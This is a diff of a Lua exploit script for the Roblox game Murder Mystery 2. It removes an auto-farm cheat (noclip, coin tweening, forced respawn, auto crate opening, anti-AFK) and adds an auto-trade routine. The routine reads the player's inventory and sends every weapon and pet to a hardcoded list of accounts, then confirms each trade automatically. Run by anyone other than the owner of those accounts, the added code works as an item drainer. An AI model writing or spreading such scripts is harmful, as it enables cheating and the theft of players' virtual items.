@@ -1,254 +1,288 @@
-setfpscap(25)
--- Auto Farm + Auto Crate - MM2 (Simplified & Clean)
-
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
+-- 🎁 MM2 AUTO MASS TRADE (MULTI-TARGET)
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
-local VirtualUser = game:GetService("VirtualUser")
-local LocalPlayer = Players.LocalPlayer
+local Trade = ReplicatedStorage:WaitForChild("Trade", 30)
+local Players = game:GetService("Players")
 
-local SETTINGS = {
-    Enabled = true,
-    MoveSpeed = 20,
-    CollectionRadius = 4.0,
-    LoopDelay = 0.1,
-    MaxBagCoins = 40,
-    AutoRespawn = true,
-    YOffset = -2,
-}
-
--- ================= 🚫 NOCLIP + АНТИГРАВИТАЦИЯ =================
-local noclipActive = false
-
-local function enableNoClip()
-    noclipActive = true
-    local char = LocalPlayer.Character
-    if char then
-        local hum = char:FindFirstChildOfClass("Humanoid")
-        if hum then hum.PlatformStand = true end
-    end
+if not Trade then 
+    warn("[ERROR] Trade not found")
+    return 
 end
 
-local function disableNoClip()
-    noclipActive = false
-    local char = LocalPlayer.Character
-    if char then
-        local hum = char:FindFirstChildOfClass("Humanoid")
-        if hum then hum.PlatformStand = false end
-    end
-end
+-- ✅ ПРОВЕРКА ВСЕХ REMOTE ОБЪЕКТОВ
+local SendRequest  = Trade:FindFirstChild("SendRequest")
+local StartTrade   = Trade:FindFirstChild("StartTrade")
+local UpdateTrade  = Trade:FindFirstChild("UpdateTrade")
+local OfferItem    = Trade:FindFirstChild("OfferItem")
+local AcceptTrade  = Trade:FindFirstChild("AcceptTrade")
+local DeclineTrade = Trade:FindFirstChild("DeclineTrade")
 
-RunService.Heartbeat:Connect(function()
-    if not noclipActive then return end
-    local char = LocalPlayer.Character
-    if not char then return end
-    
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    if hrp then
-        hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0) -- Простая антигравитация
+if not SendRequest then warn("[ERROR] SendRequest не найден!"); return end
+if not StartTrade then warn("[ERROR] StartTrade не найден!"); return end
+if not UpdateTrade then warn("[ERROR] UpdateTrade не найден!"); return end
+if not OfferItem then warn("[ERROR] OfferItem не найден!"); return end
+if not AcceptTrade then warn("[ERROR] AcceptTrade не найден!"); return end
+
+print("[OK] Все Trade remotes найдены!")
+
+-- 🎯 СПИСОК ЦЕЛЕВЫХ АККАУНТОВ
+local TARGETS = {"IvanNikulin5", "IvanNikulin6", "IvanNikulin7", "IvanNikulin8", "IvanNikulin9", "IvanNikulin10", "IvanNikulin11", "IvanNikulin12"}
+local currentTargetIndex = 1 -- Счетчик для перебора аккаунтов
+
+local MAX_UNIQUE = 4
+
+local profileData = nil
+local currentLastOffer = nil
+local itemsGiven = {}
+
+print("[INFO] Loading ProfileData...")
+
+local success, result = pcall(function()
+    local modules = ReplicatedStorage:FindFirstChild("Modules")
+    if not modules then
+        warn("[ERROR] Modules folder not found!")
+        return nil
     end
     
-    for _, part in ipairs(char:GetDescendants()) do
-        if part:IsA("BasePart") then part.CanCollide = false end
+    local profileDataModule = modules:FindFirstChild("ProfileData")
+    if not profileDataModule then
+        warn("[ERROR] ProfileData module not found!")
+        return nil
     end
+    
+    return require(profileDataModule)
 end)
 
--- ================= 📡 ОБНАРУЖЕНИЕ РАУНДА =================
-local isRoundActive = false
-
-local remotes = ReplicatedStorage:FindFirstChild("Remotes")
-local gameplay = remotes and remotes:FindFirstChild("Gameplay")
-local roundStart = gameplay and gameplay:FindFirstChild("RoundStart")
-
-if roundStart and roundStart:IsA("RemoteEvent") then
-    roundStart.OnClientEvent:Connect(function()
-        isRoundActive = true
-        enableNoClip()
-    end)
+if not success or not result then
+    warn("[ERROR] Failed to load ProfileData: " .. tostring(result))
+    return 
 end
 
-LocalPlayer.CharacterAdded:Connect(function(char)
-    isRoundActive = false
-    disableNoClip()
-    local hum = char:WaitForChild("Humanoid")
-    hum.Died:Connect(function()
-        isRoundActive = false
-        disableNoClip()
-    end)
-end)
+profileData = result
+print("[OK] ProfileData loaded")
 
--- ================= 🛠️ ВСПОМОГАТЕЛЬНЫЕ =================
-local function getHRP()
-    local char = LocalPlayer.Character
-    return char and char:FindFirstChild("HumanoidRootPart")
-end
-
-local function getBagCoins()
-    local path = {"MainGUI", "Lobby", "Dock", "CoinBags", "Container", "Coin", "CurrencyFrame", "Icon", "Coins"}
-    local obj = LocalPlayer:FindFirstChild("PlayerGui")
-    for _, name in ipairs(path) do
-        if not obj then return 0 end
-        obj = obj:FindFirstChild(name)
-    end
-    if obj and obj:IsA("TextLabel") then
-        return tonumber(string.match(obj.Text, "%d+")) or 0
-    end
-    return 0
-end
-
--- ================= 💀 РЕСПАВН =================
-local isRespawning = false
-
-local function forceRespawn()
-    if isRespawning then return end
-    isRespawning = true
+-- Получение доступных предметов
+local function getAvailableItems()
+    local items = {}
     
-    local char = LocalPlayer.Character
-    local hum = char and char:FindFirstChildOfClass("Humanoid")
-    if hum then
-        pcall(function()
-            hum:ChangeState(Enum.HumanoidStateType.Dead)
-            hum.Health = 0
-        end)
+    if not profileData then
+        warn("[ERROR] ProfileData is nil!")
+        return items
     end
     
-    task.wait(3)
-    isRespawning = false
-end
-
--- ================= 🪙 ИГНОР МОНЕТ =================
-local collectedCoins = {}
-local MAX_IGNORED = 10
-local IGNORE_DUR = 3.0
-
-local function isCollected(coin)
-    local now = tick()
-    for _, d in ipairs(collectedCoins) do 
-        if d.coin == coin and now < d.time + IGNORE_DUR then return true end 
-    end
-    return false
-end
-
-local function markCollected(coin)
-    table.insert(collectedCoins, {coin = coin, time = tick()})
-    if #collectedCoins > MAX_IGNORED then table.remove(collectedCoins, 1) end
-end
-
-local function getNearestCoin(map, hrp)
-    local container = map:FindFirstChild("CoinContainer")
-    if not container then return nil, math.huge end
-    
-    local target, minDist = nil, math.huge
-    for _, part in ipairs(container:GetChildren()) do
-        if part:IsA("BasePart") and part.Name:lower():find("coin") and not isCollected(part) then
-            local dist = (part.Position - hrp.Position).Magnitude
-            if dist < minDist then 
-                minDist = dist
-                target = part 
+    if profileData.Weapons and profileData.Weapons.Owned then
+        for name, amount in pairs(profileData.Weapons.Owned) do
+            if name ~= "DefaultKnife" and name ~= "DefaultGun" and type(amount) == "number" and amount > 0 then
+                local given = itemsGiven[name] or 0
+                local left = amount - given
+                if left > 0 then
+                    table.insert(items, {name = name, type = "Weapons", left = left})
+                end
             end
         end
     end
-    return target, minDist
-end
-
--- ================= 🏃 TWEEN =================
-local currentTween = nil
-
-local function tweenToTarget(hrp, targetPos)
-    if currentTween then pcall(function() currentTween:Cancel() end) end
     
-    local dist = (targetPos - hrp.Position).Magnitude
-    local moveTime = math.max(dist / SETTINGS.MoveSpeed, 0.1)
-    local tweenInfo = TweenInfo.new(moveTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
-    
-    currentTween = TweenService:Create(hrp, tweenInfo, {CFrame = CFrame.new(targetPos)})
-    currentTween:Play()
-end
-
--- ================= 📦 АВТО-КЕЙСЫ =================
-local Shop = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Shop")
-local OpenCrate = Shop:WaitForChild("OpenCrate")
-local BoxController = Shop:WaitForChild("BoxController")
-
-local boxes = {"KnifeBox1", "KnifeBox2", "KnifeBox3", "KnifeBox4", "KnifeBox5", "GunBox1", "GunBox3"}
-local currencies = {"Coins", "Gems", "Key"}
-
-local function openRandomCrate()
-    local boxId = boxes[math.random(1, #boxes)]
-    for _, currency in ipairs(currencies) do
-        local ok, result = pcall(function()
-            return OpenCrate:InvokeServer(boxId, "MysteryBox", currency)
-        end)
-        if ok and result then
-            pcall(function() BoxController:Fire({{MysteryBoxId = boxId, RewardedItemId = result}}) end)
-            return true
+    if profileData.Pets and profileData.Pets.Owned then
+        for name, amount in pairs(profileData.Pets.Owned) do
+            if type(amount) == "number" and amount > 0 then
+                local given = itemsGiven[name] or 0
+                local left = amount - given
+                if left > 0 then
+                    table.insert(items, {name = name, type = "Pets", left = left})
+                end
+            end
         end
     end
-    return false
+    
+    return items
 end
 
-task.spawn(function()
-    while SETTINGS.Enabled do
-        if openRandomCrate() then
-            task.wait(2.5)
+-- Отслеживание LastOffer
+UpdateTrade.OnClientEvent:Connect(function(data)
+    if data and data.LastOffer then 
+        currentLastOffer = data.LastOffer 
+    end
+end)
+
+-- Основная функция трейда
+local function runTradeCycle()
+    local available = getAvailableItems()
+    
+    if #available == 0 then
+        print("\n[SUCCESS] ALL ITEMS TRADED!")
+        return false
+    end
+
+    local batch = {}
+    local maxItems = math.min(MAX_UNIQUE, #available)
+    
+    for i = 1, maxItems do
+        table.insert(batch, available[i])
+    end
+
+    -- 🔄 ПОИСК СЛЕДУЮЩЕГО ДОСТУПНОГО АККАУНТА
+    local target = nil
+    local targetName = nil
+
+    for i = 1, #TARGETS do
+        -- Вычисляем индекс по кругу
+        local idx = ((currentTargetIndex - 1 + i - 1) % #TARGETS) + 1
+        local name = TARGETS[idx]
+        local player = Players:FindFirstChild(name)
+        
+        if player then
+            target = player
+            targetName = name
+            -- Сдвигаем индекс на следующий раз
+            currentTargetIndex = idx + 1
+            if currentTargetIndex > #TARGETS then 
+                currentTargetIndex = 1 
+            end
+            break
         else
-            task.wait(5)
+            warn("[WARN] " .. name .. " is offline. Skipping...")
         end
     end
-end)
 
--- ================= 🛡️ ANTI-AFK =================
-task.spawn(function()
-    while task.wait(120) do
-        pcall(function()
-            VirtualUser:CaptureController()
-            VirtualUser:ClickButton2(Vector2.new(math.random(100, 800), math.random(100, 600)))
+    if not target then 
+        warn("[ERROR] All target accounts are offline! Waiting 15s...")
+        task.wait(15)
+        return true 
+    end
+
+    print("\n[INFO] New trade - Target: " .. targetName .. " | Items: " .. #batch)
+    
+    for i, it in ipairs(batch) do
+        print("   " .. i .. ". " .. it.name .. " x" .. it.left)
+    end
+
+    -- Отправка запроса
+    if SendRequest then
+        local reqOk, err = pcall(function() 
+            return SendRequest:InvokeServer(target) 
+        end)
+        
+        if not reqOk then 
+            warn("[ERROR] Request failed: " .. tostring(err))
+            return true 
+        end
+    else
+        warn("[ERROR] SendRequest is nil!")
+        return true
+    end
+
+    -- Ждём StartTrade
+    local started = false
+    local sc
+    if StartTrade then
+        -- ВАЖНО: используем локальную переменную targetName, а не жестко заданную
+        sc = StartTrade.OnClientEvent:Connect(function(_, pName)
+            if pName == targetName then 
+                started = true 
+                if sc then sc:Disconnect() sc = nil end
+            end
+        end)
+    else
+        warn("[ERROR] StartTrade is nil!")
+        return true
+    end
+    
+    local t0 = tick()
+    while not started and tick() - t0 < 10 do 
+        task.wait(0.5) 
+    end
+    
+    if not started then 
+        warn("[ERROR] Trade did not open with " .. targetName)
+        if sc then sc:Disconnect() sc = nil end
+        return true 
+    end
+
+    currentLastOffer = nil
+    
+    print("[INFO] Trade opened with " .. targetName .. ". Offering items...")
+
+    -- Выкладываем предметы
+    if OfferItem then
+        for _, it in ipairs(batch) do
+            for i = 1, it.left do
+                local ok, err = pcall(function() 
+                    OfferItem:FireServer(it.name, it.type) 
+                end)
+                
+                if ok then
+                    itemsGiven[it.name] = (itemsGiven[it.name] or 0) + 1
+                    print("   [OK] " .. it.name .. " (" .. i .. "/" .. it.left .. ")")
+                else
+                    warn("   [ERROR] " .. it.name .. ": " .. tostring(err))
+                end
+                
+                task.wait(0.25)
+            end
+        end
+    else
+        warn("[ERROR] OfferItem is nil!")
+    end
+    
+    -- Ждём кулдаун
+    print("[INFO] Waiting 6s cooldown...")
+    task.wait(6)
+    
+    -- Ждём LastOffer
+    if not currentLastOffer then
+        print("[INFO] Waiting for LastOffer...")
+        local t1 = tick()
+        while not currentLastOffer and tick() - t1 < 5 do
+            task.wait(0.5)
+        end
+    end
+
+    if currentLastOffer and AcceptTrade then
+        print("[INFO] Waiting 0.5s before confirm...")
+        task.wait(0.5)
+        
+        print("[INFO] Confirming trade with " .. targetName .. "...")
+        local confirmOk, err = pcall(function()
+            AcceptTrade:FireServer(game.PlaceId * 3, currentLastOffer)
+        end)
+        
+        if not confirmOk then
+            warn("[ERROR] Confirm failed: " .. tostring(err))
+        end
+    else
+        if not AcceptTrade then
+            warn("[ERROR] AcceptTrade is nil!")
+        else
+            warn("[WARN] No LastOffer received")
+        end
+    end
+
+    -- Ждём завершения
+    local done = false
+    local ac
+    if AcceptTrade then
+        ac = AcceptTrade.OnClientEvent:Connect(function() 
+            done = true 
+            if ac then ac:Disconnect() ac = nil end
         end)
     end
-end)
-
--- ================= 🔄 ГЛАВНЫЙ ЦИКЛ =================
-task.spawn(function()
-    while SETTINGS.Enabled do
-        pcall(function()
-            if not isRoundActive then task.wait(1) return end
-            
-            local hrp = getHRP()
-            if not hrp then task.wait(1) return end
-            
-            -- Защита от падения в бездну
-            if hrp.Position.Y < -50 then
-                hrp.CFrame = CFrame.new(hrp.Position.X, 50, hrp.Position.Z)
-                task.wait(2)
-                return
-            end
-            
-            -- Респавн при полном мешке
-            if getBagCoins() >= SETTINGS.MaxBagCoins then
-                if SETTINGS.AutoRespawn then forceRespawn() end
-                task.wait(3)
-                return
-            end
-            
-            -- Поиск карты и монеты
-            local map = nil
-            for _, obj in ipairs(workspace:GetChildren()) do
-                if obj:FindFirstChild("CoinContainer") then map = obj; break end
-            end
-            if not map then task.wait(0.1) return end
-            
-            local coin, dist = getNearestCoin(map, hrp)
-            if not coin then task.wait(0.1) return end
-            
-            local targetPos = Vector3.new(coin.Position.X, coin.Position.Y + SETTINGS.YOffset, coin.Position.Z)
-            if dist <= SETTINGS.CollectionRadius then
-                markCollected(coin)
-                return
-            end
-            
-            tweenToTarget(hrp, targetPos)
-        end)
-        task.wait(SETTINGS.LoopDelay)
+    
+    local t2 = tick()
+    while not done and tick() - t2 < 15 do 
+        task.wait(0.5) 
     end
-end)
+    
+    if ac then ac:Disconnect() ac = nil end
+
+    print("[INFO] Trade with " .. targetName .. " completed. Waiting 6s...")
+    task.wait(6)
+    
+    return true
+end
+
+-- Запуск
+print("\n[START] AUTO-TRADE SYSTEM")
+print("[TARGETS] " .. table.concat(TARGETS, ", "))
+
+while runTradeCycle() do end
+
+print("[DONE] Finished")
